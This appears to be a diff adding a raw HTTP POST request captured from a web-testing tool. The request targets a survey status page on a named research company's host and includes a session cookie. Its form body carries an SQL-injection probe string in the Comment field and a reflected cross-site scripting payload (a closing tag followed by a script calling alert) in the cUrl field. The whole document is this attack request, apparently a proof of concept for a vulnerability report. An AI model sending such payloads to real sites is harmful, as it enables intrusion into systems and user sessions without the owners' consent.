@@ -1,0 +1,23 @@
+POST /survey/15JT041/15JT041L0/surveystatus.asp HTTP/1.1
+Host: onsite2.researchintel.com
+Cookie: uid=148818977094M1650762500214; ASPSESSIONIDSWARSSBS=OOCAEKNBNCDAHDEJPJDOPGPH
+Content-Length: 86
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="95", ";Not A Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Upgrade-Insecure-Requests: 1
+Origin: https://onsite2.researchintel.com
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://onsite2.researchintel.com/survey/15JT041/15JT041L0/surveystatus.asp
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+Comment=é"'"(--è_è&Response1=10&screenSize=1366x768&cUrl="/><script>alert(1);</script>
